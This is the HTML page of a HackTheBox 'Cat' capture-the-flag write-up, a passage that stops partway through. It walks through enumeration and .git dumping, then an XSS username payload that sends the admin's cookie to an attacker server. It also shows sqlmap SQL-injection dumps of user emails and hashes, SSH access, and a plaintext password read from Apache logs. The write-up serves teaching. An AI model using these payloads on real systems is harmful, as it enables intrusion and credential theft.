@@ -1,0 +1,2326 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HackTheBox - Cat Writeup | 0xblivion.dev</title>
+<meta name="keywords" content="HackTheBox, Cat, htb-cat, XSS, SQL Injection, Web Exploitation, Git Exploitation, Gitea, Cookie Hijacking, Privilege Escalation, Linux, Writeup">
+<meta name="description" content="Overview
+
+This box focuses on web application vulnerabilities, specifically Cross-Site Scripting (XSS) and SQL Injection, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.">
+<meta name="author" content="0xblivion">
+<link rel="canonical" href="https://0xblivion.dev/posts/htb/linux/medium/hackthebox-cat-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7bb9e509f32b776e3778b3ea8539776721782bd73f8019534361265046bfd155.css" integrity="sha256-e7nlCfMrd243eLPqhTl3ZyF4K9c/gBlTQ2EmUEa/0VU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://0xblivion.dev/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xblivion.dev/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xblivion.dev/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xblivion.dev/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xblivion.dev/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://0xblivion.dev/posts/htb/linux/medium/hackthebox-cat-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://0xblivion.dev/posts/htb/linux/medium/hackthebox-cat-writeup/">
+  <meta property="og:site_name" content="0xblivion.dev">
+  <meta property="og:title" content="HackTheBox - Cat Writeup">
+  <meta property="og:description" content="Overview This box focuses on web application vulnerabilities, specifically Cross-Site Scripting (XSS) and SQL Injection, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-05T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Cat">
+    <meta property="article:tag" content="Htb-Cat">
+    <meta property="article:tag" content="Xss">
+    <meta property="article:tag" content="SQL Injection">
+    <meta property="article:tag" content="Web Exploitation">
+    <meta property="og:image" content="https://0xblivion.dev/img/cat/og-cat.png">
+  
+  <meta name="author" content="0xblivion">
+  <meta property="article:author" content="0xblivion">
+  <meta property="og:article:author" content="0xblivion">
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "author": {
+        "@type": "Person",
+        "name": "0xblivion"
+      }
+    }
+  </script>
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0xblivion.dev/img/cat/og-cat.png">
+<meta name="twitter:title" content="HackTheBox - Cat Writeup">
+<meta name="twitter:description" content="Overview
+
+This box focuses on web application vulnerabilities, specifically Cross-Site Scripting (XSS) and SQL Injection, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xblivion.dev/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox - Cat Writeup",
+      "item": "https://0xblivion.dev/posts/htb/linux/medium/hackthebox-cat-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HackTheBox - Cat Writeup",
+  "name": "HackTheBox - Cat Writeup",
+  "description": "Overview This box focuses on web application vulnerabilities, specifically Cross-Site Scripting (XSS) and SQL Injection, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.\n",
+  "keywords": [
+    "HackTheBox", "Cat", "htb-cat", "XSS", "SQL Injection", "Web Exploitation", "Git Exploitation", "Gitea", "Cookie Hijacking", "Privilege Escalation", "Linux", "Writeup"
+  ],
+  "articleBody": "Overview This box focuses on web application vulnerabilities, specifically Cross-Site Scripting (XSS) and SQL Injection, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.\n+ − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access .git Directory [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Dump Source Code (config.php, contest.php) [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Find XSS in Cat Registration [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Exploit XSS → Steal Admin Cookie [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Access Admin Panel → SQL Injection [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Dump Users → Crack rosa Password [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as rosa [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Read Apache Logs → Get axel Password [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as axel [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Access Gitea on localhost:3000 [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Stored XSS in Repo Description [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Exfil index.php → Discover Root Creds [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]SU to root → Capture Root Flag Target IP 10.10.11.53 1. Kicking Off with Nmap As always, we start with an nmap scan to see what services are running on the target.\n0xblivion@cat: ~ root@localhost:~# sudo nmap -sVC -oA nmap/cat 10.10.11.53 -vv Nmap 7.95 scan initiated Thu Jul 3 22:46:57 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/cat -vv 10.10.11.53 Nmap scan report for 10.10.11.53 Host is up, received echo-reply ttl 63 (0.055s latency). Scanned at 2025-07-03 22:46:57 EDT for 9s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0= | 256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4= | 256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://cat.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 3 22:47:06 2025 -- 1 IP address (1 host up) scanned in 9.39 seconds copy The scans reveal port 22/tcp which is SSH and a web server on 80/tcp using Apache. Nmap confirms this is a Linux (Ubuntu) machine.\nThe HTTP service on port 80 shows a redirect to cat.htb, so we should add this to our /etc/hosts file.\n0xblivion@cat: ~ root@localhost:~# echo \"10.10.11.53 cat.htb\" | sudo tee -a /etc/hosts copy 2. Gaining Initial Access Footprinting \u0026 Exploring the Site Visiting http://cat.htb/ in a browser, we see a website dedicated to a cat competition.\nWappalyzer confirms the site is running Apache HTTP Server on Ubuntu and uses PHP.\nExploring the site: The Vote page (http://cat.htb/vote.php) indicates voting is closed and buttons are unresponsive.\nThe Contest page redirects to http://cat.htb/join.php, where we can register a new user.\nAfter registering, we can access contest.php to register a cat, which involves providing a cat name, age, birthdate, weight, and photo. This looks like a potential area for vulnerabilities like XSS or file upload exploits.\nBut assumptions can lead us into rabbithole. Let’s try to recon.\nWeb Enumeration We run gobuster to enumerate directories and files on the web server.\n0xblivion@cat: ~ root@localhost:~# gobuster dir -u http://cat.htb/ -w /opt/SecLists/Discovery/Web-Content/common.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://cat.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.git (Status: 301) [Size: 301] [--\u003e http://cat.htb/.git/] /.git/HEAD (Status: 200) [Size: 23] /.git/config (Status: 200) [Size: 92] /.git/logs/ (Status: 403) [Size: 272] /.git/index (Status: 200) [Size: 1726] /.htaccess (Status: 403) [Size: 272] /.htpasswd (Status: 403) [Size: 272] /.hta (Status: 403) [Size: 272] /admin.php (Status: 302) [Size: 1] [--\u003e /join.php] /css (Status: 301) [Size: 300] [--\u003e http://cat.htb/css/] /img (Status: 301) [Size: 300] [--\u003e http://cat.htb/img/] /index.php (Status: 200) [Size: 3075] /server-status (Status: 403) [Size: 272] /uploads (Status: 301) [Size: 304] [--\u003e http://cat.htb/uploads/] Progress: 4750 / 4750 (100.00%) =============================================================== Finished =============================================================== copy The gobuster scan reveals an exposed .git/ repository and an admin.php page that redirects to join.php. We’ll focus on the .git directory and keep admin.php in mind.\nWe also run gobuster with the -x php flag and a larger wordlist to find more PHP files.\n0xblivion@cat: ~ root@localhost:~# gobuster dir -u http://cat.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://cat.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 272] /admin.php (Status: 302) [Size: 1] [--\u003e /join.php] /.html (Status: 403) [Size: 272] ...SNIP... copy Subdomain Enumeration We perform subdomain enumeration using ffuf to ensure we don’t miss any hidden attack vectors.\n0xblivion@cat: ~ root@localhost:~# ffuf -u http://cat.htb/ -H 'Host: FUZZ.cat.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fl 10 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://cat.htb/ :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.cat.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response lines: 10 ________________________________________________ :: Progress: [19966/19966] :: Job [1/1] :: 716 req/sec :: Duration: [0:00:31] :: Errors: 0 :: copy The subdomain scan returns no interesting results.\nDumping .git/ using git-dumper We dump the exposed .git repository to analyze its contents.\n0xblivion@cat: ~ root@localhost:~# mkdir git-dump; git-dumper http://cat.htb/ git-dump/ [-] Testing http://cat.htb/.git/HEAD [200] [-] Testing http://cat.htb/.git/ [403] [-] Fetching common files [-] Fetching http://cat.htb/.gitignore [404] [-] Fetching http://cat.htb/.git/hooks/applypatch-msg.sample [200] [-] Fetching http://cat.htb/.git/COMMIT_EDITMSG [200] [-] http://cat.htb/.gitignore responded with status code 404 [-] Fetching http://cat.htb/.git/description [200] [-] Fetching http://cat.htb/.git/hooks/commit-msg.sample [200] [-] Fetching http://cat.htb/.git/hooks/post-commit.sample [404] ...SNIP... [-] Running git checkout . copy After dumping the repository, we list the files to see what we’ve obtained.\n0xblivion@cat: ~ root@localhost:~# ls git-dump/ accept_cat.php admin.php config.php contest.php css delete_cat.php img img_winners index.php join.php logout.php view_cat.php vote.php winners winners.php copy Analyzing the source code, we find a potential XSS vulnerability in contest.php where the owner_username from the session is inserted into the database without proper sanitization. This username is then displayed in view_cat.php.\n// contest.php // Check if $uploadOk is set to 0 by an error if ($uploadOk == 0) { } else { if (move_uploaded_file($_FILES[\"cat_photo\"][\"tmp_name\"], $target_file)) { // Prepare SQL query to insert cat data $stmt = $pdo-\u003eprepare(\"INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)\"); // Bind parameters $stmt-\u003ebindParam(':cat_name', $cat_name, PDO::PARAM_STR); $stmt-\u003ebindParam(':age', $age, PDO::PARAM_INT); $stmt-\u003ebindParam(':birthdate', $birthdate, PDO::PARAM_STR); $stmt-\u003ebindParam(':weight', $weight, PDO::PARAM_STR); $stmt-\u003ebindParam(':photo_path', $target_file, PDO::PARAM_STR); $stmt-\u003ebindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR); // Execute query if ($stmt-\u003eexecute()) { $success_message = \"Cat has been successfully sent for inspection.\"; } else { $error_message = \"Error: There was a problem registering the cat.\"; } } else { $error_message = \"Error: There was a problem uploading the file.\"; } } } And then in the view_cat.php file, this parameter is retrieved and displayed:\n// Get the cat_id from the URL $cat_id = isset($_GET['cat_id']) ? $_GET['cat_id'] : null; if ($cat_id) { // Prepare and execute the query $query = \"SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id\"; $statement = $pdo-\u003eprepare($query); $statement-\u003ebindParam(':cat_id', $cat_id, PDO::PARAM_INT); $statement-\u003eexecute(); // Fetch cat data from the database $cat = $statement-\u003efetch(PDO::FETCH_ASSOC); if (!$cat) { die(\"Cat not found.\"); } } else { die(\"Invalid cat ID.\"); } Exploiting XSS to get Admin Session We’ll register a new user with an XSS payload in the username, designed to exfiltrate the PHPSESSID cookie.\n\u003cimg src=x onerror=this.src=\"http://:/\"+btoa(document.cookie)\u003e First, we set up a simple Python web server to capture the exfiltrated cookie.\n0xblivion@cat: ~ root@localhost:~# php -S 0.0.0.0:80 [Thu Jul 3 23:40:54 2025] PHP 8.4.8 Development Server (http://0.0.0.0:80) started copy We register a new account on http://cat.htb/join.php using the XSS payload as the username and any valid email/password.\nThen, we log in with the newly registered XSS user and navigate to contest.php to register a cat. This action triggers the XSS, as the owner_username (containing our payload) is processed.\nOn our PHP web server, we capture the base64 encoded cookie:\n0xblivion@cat: ~ root@localhost:~# php -S 0.0.0.0:80 [Thu Jul 3 23:40:54 2025] PHP 8.4.8 Development Server (http://0.0.0.0:80) started [Fri Jul 4 00:02:23 2025] 10.10.11.53:36812 [200]: GET /UEhQU0VTU0lEPXM0YWcyaWpkMDA0cWg2YTJwbzMxZm1jNThj [Fri Jul 4 00:02:23 2025] 10.10.11.53:36812 Closing [Fri Jul 4 00:02:23 2025] 10.10.11.53:36818 Accepted [Fri Jul 4 00:02:23 2025] 10.10.11.53:36818 [200]: GET /UEhQU0VTU0lEPXM0YWcyaWpkMDA0cWg2YTJwbzMxZm1jNThj copy We decode the captured cookie:\n0xblivion@cat: ~ root@localhost:~# echo \"UEhQU0VTU0lEPTduOTFkcmVnanFqZ2lhdWIzdG9ocGhhcGMy\" | base64 -d PHPSESSID=7n91dregjqjgiaub3tohphapc2 copy We then use the browser’s developer console to change our PHPSESSID cookie to the captured value:\nAfter refreshing the site, we gain access to the admin panel:\nSQL Injection From the dumped source code, config.php reveals that the application uses SQLite:\nFurther analysis of accept_cat.php shows a SQL Injection vulnerability in the catName parameter.\nWe intercept a request to accept_cat.php using Burp Suite and save it to a file named accepet_cat.req:\n0xblivion@cat: ~ root@localhost:~# cat accepet_cat.req POST /accept_cat.php HTTP/1.1 Host: cat.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 21 Origin: http://cat.htb Connection: keep-alive Referer: http://cat.htb/admin.php Cookie: PHPSESSID=dfvc101c10h4bv5nihmdnkp300 Priority: u=0 catName=awdaw\u0026catId=1 copy We use sqlmap to exploit the SQL Injection vulnerability in the catName parameter:\n0xblivion@cat: ~ root@localhost:~# sqlmap -r accepet_cat.req --batch -p catName --level 5 --risk 3 ___ __H__ ___ ___[.]_____ ___ ___ {1.9.4#stable} |_ -| . [.] | .'| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 11:07:26 /2025-07-05/ [11:07:26] [INFO] parsing HTTP request from 'accepet_cat.req' [11:07:26] [INFO] resuming back-end DBMS 'sqlite' [11:07:26] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: catName (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'\u0026catId=1 --- [11:07:27] [INFO] the back-end DBMS is SQLite web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan) web application technology: Apache 2.4.41 back-end DBMS: SQLite [11:07:27] [INFO] fetched data logged to text files under '/home/gen/.local/share/sqlmap/output/cat.htb' [*] ending @ 11:07:27 /2025-07-05/ copy Confirming the SQL Injection, we proceed to dump the database tables:\n0xblivion@cat: ~ root@localhost:~# sqlmap -r accepet_cat.req --batch -p catName --level 5 --risk 3 --tables ___ __H__ ___ ___[)]_____ ___ ___ {1.9.4#stable} |_ -| . [)] | .'| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 11:09:16 /2025-07-05/ [11:09:16] [INFO] parsing HTTP request from 'accepet_cat.req' [11:09:16] [INFO] resuming back-end DBMS 'sqlite' [11:09:16] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: catName (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'\u0026catId=1 --- [11:09:16] [INFO] the back-end DBMS is SQLite web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal) web application technology: Apache 2.4.41 back-end DBMS: SQLite [11:09:16] [INFO] fetching tables for database: 'SQLite_masterdb' [11:09:16] [INFO] fetching number of tables for database 'SQLite_masterdb' [11:09:16] [INFO] resumed: 4 [11:09:16] [INFO] resumed: accepted_cats [11:09:16] [INFO] resumed: sqlite_sequence [11:09:16] [INFO] resumed: cats [11:09:16] [INFO] resumed: users [4 tables] +-----------------+ | accepted_cats | | cats | | sqlite_sequence | | users | +-----------------+ [11:09:16] [INFO] fetched data logged to text files under '/home/gen/.local/share/sqlmap/output/cat.htb' [*] ending @ 11:09:16 /2025-07-05/ copy The users table is of particular interest. We dump its contents:\n0xblivion@cat: ~ root@localhost:~# sqlmap -r accepet_cat.req --batch -p catName --level 5 --risk 3 -T users --dump __ __H__ ___ ___[\"]_____ ___ ___ {1.9.4#stable} |_ -| . [)] | .'| . | |___|_ [']_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 11:10:58 /2025-07-05/ [11:10:58] [INFO] parsing HTTP request from 'accepet_cat.req' [11:10:58] [INFO] resuming back-end DBMS 'sqlite' [11:10:58] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: catName (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'\u0026catId=1 --- [11:10:58] [INFO] the back-end DBMS is SQLite web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal) web application technology: Apache 2.4.41 back-end DBMS: SQLite ...SNIP... Database: Table: users [10 entries] ...SNIP... copy The dump reveals 10 user entries. We extract the usernames and hashes into a username:password format:\nuser_id email password username 1 axel2017@gmail.com d1bbba3670feb9435c9841e46e60ee2f axel 2 rosamendoza485@gmail.com ac369922d560f17d6eeb8b2c7dec498c rosa 3 robertcervantes2000@gmail.com 42846631708f69c00ec0c0a8aa4a92ad robert 4 fabiancarachure2323@gmail.com 39e153e825c4a3d314a0dc7f7475ddbe fabian 5 jerrysonC343@gmail.com 781593e060f8d065cd7281c5ec5b4b86 jerryson 6 larryP5656@gmail.com 1b6dce240bbfbc0905a664ad199e18f8 larry 7 royer.royer2323@gmail.com c598f6b844a36fa7836fba0835f1f6 royer 8 peterCC456@gmail.com e41ccefa439fc454f7eadbf1f139ed8a peter 9 angel234g@gmail.com 24a8ec003ac2e1b3c5953a6f95f8f565 angel 10 jobert2020@gmail.com 88e4dceccd48820cf77b5cf6c08698ad jobert 0xblivion@cat: ~ root@localhost:~# grep -E '\\|[[:space:]]*[0-9]+[[:space:]]*\\|' dump.txt | awk -F '|' '{for(i=1;i\u003c=NF;i++)gsub(/^[ \\t]+|[ \\t]+$/, \"\", $i); if(NF\u003e=5 \u0026\u0026 $5!=\"\") print $5 \":\" $4}' | tee hashes.txt axel:d1bbba3670feb9435c9841e46e60ee2f rosa:ac369922d560f17d6eeb8b2c7dec498c robert:42846631708f69c00ec0c0a8aa4a92ad fabian:39e153e825c4a3d314a0dc7f7475ddbe jerryson:781593e060f8d065cd7281c5ec5b4b86 larry:1b6dce240bbfbc0905a664ad199e18f8 royer:c598f6b844a36fa7836fba0835f1f6 peter:e41ccefa439fc454f7eadbf1f139ed8a angel:24a8ec003ac2e1b3c5953a6f95f8f565 copy We extract only the hashes to use with an online cracker like CrackStation.\n0xblivion@cat: ~ root@localhost:~# cat hashes.txt | awk -F: '{print $2}' d1bbba3670feb9435c9841e46e60ee2f ac369922d560f17d6eeb8b2c7dec498c 42846631708f69c00ec0c0a8aa4a92ad 39e153e825c4a3d314a0dc7f7475ddbe 781593e060f8d065cd7281c5ec5b4b86 1b6dce240bbfbc0905a664ad199e18f8 c598f6b844a36fa7836fba0835f1f6 e41ccefa439fc454f7eadbf1f139ed8a 24a8ec003ac2e1b3c5953a6f95f8f565 copy Submitting these hashes to CrackStation, we find one cracked password:\nWe identify the user associated with the cracked hash:\n0xblivion@cat: ~ root@localhost:~# cat hashes.txt| grep ac369922d560f17d6eeb8b2c7dec498c rosa:ac369922d560f17d6eeb8b2c7dec498c copy The cracked password belongs to rosa. We attempt to SSH into the box as rosa:\n0xblivion@cat: ~ root@localhost:~# ssh rosa@cat.htb The authenticity of host 'cat.htb (10.10.11.53)' can't be established. ED25519 key fingerprint is SHA256:tsmOV3JuQkCv6HNUqg9YQ+DJznLS2nYKJl4zIwKtbE4. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:22: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'cat.htb' (ED25519) to the list of known hosts. rosa@cat.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Sat 05 Jul 2025 03:31:27 PM UTC System load: 0.01 Usage of /: 51.9% of 6.06GB Memory usage: 16% Swap usage: 0% Processes: 236 Users logged in: 0 IPv4 address for eth0: 10.10.11.53 IPv6 address for eth0: dead:beef::250:56ff:feb0:bb1a * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s just raised the bar for easy, resilient and secure K8s cluster deployment. https://ubuntu.com/engage/secure-kubernetes-at-the-edge Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64 rosa@cat:~$ copy We have successfully gained SSH access as rosa.\nUser Flag Upon logging in as rosa, we check the user’s group memberships using the id command:\n0xblivion@cat: ~ rosa@cat:~$ id uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm) copy The rosa user is part of the adm group. This group typically has permissions to read system log files and other administrative files. Since Apache is running on the server, we check its access logs for interesting information:\n0xblivion@cat: ~ rosa@cat:~$ head -5 /var/log/apache2/access.log 127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] \"GET /join.php HTTP/1.1\" 200 1683 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" 127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] \"GET /css/styles.css HTTP/1.1\" 200 1155 \"http://cat.htb/join.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" 127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] \"GET /favicon.ico HTTP/1.1\" 404 485 \"http://cat.htb/join.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" 127.0.0.1 - - [05/Jul/2025:15:04:50 +0000] \"GET /join.php?loginUsername=axel\u0026loginPassword=aNdZwgC4tI9gnVXv_e3Q\u0026loginForm=Login HTTP/1.1\" 302 329 \"http://cat.htb/join.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) 